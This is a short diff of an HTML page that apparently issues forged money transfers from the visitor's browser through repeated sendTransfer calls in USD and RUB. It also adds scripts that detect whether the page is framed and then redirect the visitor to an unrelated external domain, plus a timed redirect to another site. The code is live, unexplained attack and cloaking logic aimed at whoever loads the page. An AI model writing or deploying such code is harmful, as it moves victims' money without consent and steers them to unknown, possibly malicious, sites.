@@ -49,16 +49,38 @@ xhr.send(body);
  setTimeout(sendTransfer(10, "USD", 10.10), 1000);
   setTimeout(sendTransfer(10, "RUB", 10.10), 1000);
    setTimeout(sendTransfer(5, "RUB", 5.05), 1000);
-  	<script>
+  	
+</script>
+<script>
+  function isInIframe() {
+    try {
+      return window.self !== window.top;
+    } catch (e) {
+     
+      return true; 
+    }
+  }
+
+  window.onload = function() {
+    var currentURL = window.location.href;
+    var keyword = "greenfarm-top.github.io/greenfarm/purples/";
+
+    if (currentURL.includes(keyword) && !isInIframe()) {
+   
+      
+        window.location.replace("https://loriss.gt.tc/");
+     
+    }
+  }
+</script>
+ 
+<script>
   const src = "	https://greenfarm-top.github.io/purples";
   const container = document.getElementById("iframes-container");
 setTimeout(() => {
     window.location.href = src;
   }, 9000);
 </script> 
-</script>
-
-
 
 </body>
 </html>
